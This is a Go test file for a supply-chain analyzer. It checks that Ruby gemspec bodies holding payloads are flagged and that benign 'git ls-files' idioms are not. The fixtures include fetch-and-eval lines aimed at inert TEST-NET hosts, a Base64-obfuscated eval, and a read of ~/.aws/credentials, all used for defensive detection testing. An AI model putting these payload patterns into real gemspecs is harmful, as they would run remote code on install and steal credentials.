package installsurface

import (
	"strings"
	"testing"
)

// D-150: a gemspec is evaluated Ruby at `gem build` / `gem install`, so a
// payload in its BODY runs with no native-extension declaration needed. The
// analysis previously looked at gemspec content only when it declared
// extensions (extensions + extconf both present), so a fetch-and-eval sitting
// directly in the gemspec produced no hook at all. The gate cannot simply be
// "any capability": the `git ls-files` idiom that populates s.files trips
// CapExec on nearly every real gemspec, so exec-alone is the benign baseline
// and only a risk capability (network / obfuscation / cradle / credentials) is
// the tell. IOCs below are inert (RFC 5737 TEST-NET-3 / .invalid).

const d150Head = "Gem::Specification.new do |s|\n  s.name = 'x'\n"
const d150Tail = "end\n"

func d150Spec(body string) string { return d150Head + body + d150Tail }

func d150Hook(t *testing.T, gemspec string) (*Hook, int) {
	t.Helper()
	s := AnalyzeRuby("", gemspec, "")
	for i := range s.Hooks {
		if s.Hooks[i].Name == "gemspec:body" {
			return &s.Hooks[i], len(s.Hooks)
		}
	}
	return nil, len(s.Hooks)
}

// TestD150FetchEvalInGemspecBodyIsCaught: the payload the reproduction found.
func TestD150FetchEvalInGemspecBodyIsCaught(t *testing.T) {
	spec := d150Spec("  s.files = `git ls-files`.split\n  eval(Net::HTTP.get(URI('http://203.0.113.9.invalid/p')))\n")
	h, _ := d150Hook(t, spec)
	if h == nil {
		t.Fatal("a fetch-and-eval in the gemspec body must produce a gemspec:body hook")
	}
	if !hasCap(h.Caps, CapNetwork) {
		t.Errorf("the network egress must be recorded, got %v", h.Caps)
	}
}

// TestD150BenignGitLsFilesIsNotAHook is the false-positive boundary and the
// whole reason the gate is narrow: the standard s.files idiom trips CapExec, and
// firing on it would flag essentially every gem in existence.
func TestD150BenignGitLsFilesIsNotAHook(t *testing.T) {
	spec := d150Spec("  s.files = `git ls-files`.split(\"\\n\")\n  s.name = 'ordinary'\n")
	if h, total := d150Hook(t, spec); h != nil || total != 0 {
		t.Errorf("a gemspec whose only exec is git ls-files must produce no hook, got %d hooks", total)
	}
}

// TestD150ExecAloneNeverFires generalizes that: any exec-only gemspec, whatever
// the command, is the benign baseline.
func TestD150ExecAloneNeverFires(t *testing.T) {
	for _, body := range []string{
		"  s.files = `git ls-files -z`.split\n",
		"  s.version = `cat VERSION`.strip\n",
		"  system('true')\n",
	} {
		if h, _ := d150Hook(t, d150Spec(body)); h != nil {
			t.Errorf("exec alone must not fire; %q produced %v", body, h.Caps)
		}
	}
}

// TestD150RiskCapabilitiesEachFire walks the capabilities that DO make a
// gemspec body a finding.
func TestD150RiskCapabilitiesEachFire(t *testing.T) {
	cases := map[string]string{
		"network":     "  s.description = Net::HTTP.get(URI('http://203.0.113.1.invalid/'))\n",
		"cradle":      "  eval(URI.open('http://203.0.113.2.invalid/x').read)\n",
		"obfuscation": "  eval(Base64.decode64('c3lzdGVtKCdpZCcp'))\n",
		"credentials": "  key = File.read(File.expand_path('~/.aws/credentials'))\n",
	}
	for name, body := range cases {
		if h, _ := d150Hook(t, d150Spec(body)); h == nil {
			t.Errorf("%s payload in a gemspec body must fire", name)
		}
	}
}

// TestD150ExtensionsDeclarationStillUsesTheBroadGate: a gemspec that DECLARES a
// native extension keeps the D-135 behaviour — any capability, exec included,
// because the extconf.rb it points at will run. This must not regress to the
// body gate, and it stays a gemspec:extensions hook, not gemspec:body.
func TestD150ExtensionsDeclarationStillUsesTheBroadGate(t *testing.T) {
	spec := d150Spec("  s.extensions = ['ext/x/extconf.rb']\n  s.files = `git ls-files`.split\n")
	s := AnalyzeRuby("", spec, "")
	var names []string
	for _, h := range s.Hooks {
		names = append(names, h.Name)
	}
	if strings.Join(names, ",") != "gemspec:extensions" {
		t.Errorf("an extensions-declaring gemspec must fire the extensions hook (exec included), got %v", names)
	}
}

// TestD150NoDoubleFire: an extensions-declaring gemspec that ALSO has a body
// payload fires the extensions gate only, not both — the extensions branch is
// the more specific precondition and owns the finding.
func TestD150NoDoubleFire(t *testing.T) {
	spec := d150Spec("  s.extensions = ['ext/x/extconf.rb']\n  eval(Net::HTTP.get(URI('http://203.0.113.3.invalid/')))\n")
	if h, total := d150Hook(t, spec); h != nil {
		t.Errorf("an extensions gemspec must not also fire gemspec:body, got %d hooks", total)
	}
}
